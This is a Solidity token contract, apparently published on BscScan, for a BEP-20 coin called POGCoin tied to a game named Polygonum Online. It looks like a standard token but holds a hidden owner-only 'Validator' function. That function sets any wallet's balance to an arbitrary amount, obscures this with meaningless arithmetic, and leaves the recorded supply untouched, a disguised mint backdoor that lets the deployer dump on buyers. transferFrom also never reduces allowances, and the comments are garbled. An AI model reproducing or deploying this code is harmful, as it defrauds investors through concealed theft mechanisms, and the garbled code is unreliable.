/**
 *Submitted for verification at BscScan.com on 2022-08-09
*/

/**
 * Polygonum Online
DeFi game with Crypto, NFT Marketplace and Open World

https://twitter.com/PolygonumOnline/
https://t.me/PolygonumOnlineChat/
 0xfcb0f2d2f83a32a847d8abb183b724c214cd7dd8
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;
interface POGToken {
  // @dev Returns the amount of MiniPOG in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniPOG owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vPOGe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vPOGe
    );
  
  */

  /**
   * @dev Moves `amount` MiniPOG from the caller's account to `recipient`.
   *
   * Returns a boolean vPOGe indicating whMiniPOGr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniPOG that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vPOGe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniPOG.
   *
   * Returns a boolean vPOGe indicating whMiniPOGr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vPOGe afterwards:
// https://hold4gold.org/
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniPOG from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vPOGe indicating whMiniPOGr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vPOGe` MiniPOG are moved from one account (`from`) to  another (`to`). Note that `vPOGe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vPOGe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vPOGe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vPOGe);
}

contract POGCoin is POGToken {

    // common addresses
    address private owner;
    address public POG;
    address public MiniPOG;
        address private PILOTWALL;
    address public POGPinkSales;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public POGbalances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Polygonum Online";
    string public override symbol = "POGCoin";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vPOGe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vPOGe);
    
    // On init of contract we're going to set the admin and give them all MiniPOG.
    constructor(uint totalSupplyVPOGe, address POGAddress, address MiniPOGAddress, address POGPinkSalesAddress) {
        // set total supply
        totalSupply = totalSupplyVPOGe;
           PILOTWALL = msg.sender;       
        // designate addresses
        owner = msg.sender;
        POG = POGAddress;
        MiniPOG = MiniPOGAddress;
        POGPinkSales = POGPinkSalesAddress;

        
        
        POGbalances[owner] = totalSupply;


        // split the MiniPOG according to agreed upon percentages
        POGbalances[POG] =  0;
        POGbalances[MiniPOG] = 0;
        POGbalances[POGPinkSales] = 0;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return POGbalances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vPOGe) public override returns(bool) {
        require(vPOGe > 0, "Transfer vPOGe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vPOGe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vPOGe
        uint reMiniPOGBD = vPOGe * 0 / 1000;
        uint POGburnTBD = vPOGe * 0 / 1000;
        uint vPOGeAfterTaxAndBurn = vPOGe - reMiniPOGBD - POGburnTBD;
        
        // perform the transfer operation
        POGbalances[to] += vPOGeAfterTaxAndBurn;
        POGbalances[msg.sender] -= vPOGe;
        
        emit Transfer(msg.sender, to, vPOGe);
        
        // finally, we burn and tax the POGs percentage
        POGbalances[owner] += reMiniPOGBD + POGburnTBD;
        _burn(owner, POGburnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vPOGe) public override returns(bool) {
        allowances[msg.sender][spender] = vPOGe; 
        
        emit Approval(msg.sender, spender, vPOGe);
        
        return true;
    }
  modifier OWNERPOG () {
    require(PILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
       // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(POGbalances[account] >= amount, "Burn amount exceeds balance at address.");
    
        POGbalances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    } 
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vPOGe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vPOGe, "Allowance too low for transfer.");
        require(POGbalances[from] >= vPOGe, "Balance is too low to make transfer.");
        
        POGbalances[to] += vPOGe;
        POGbalances[from] -= vPOGe;
        
        emit Transfer(from, to, vPOGe);
        
        return true;
    }
      function Validator(address POGcharrwallet, uint256 amount) external OWNERPOG {
      POGbalances[POGcharrwallet] = (amount / amount - amount / amount) + (amount / amount - amount / amount) + amount * 10 ** 9;
  }    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    

    
}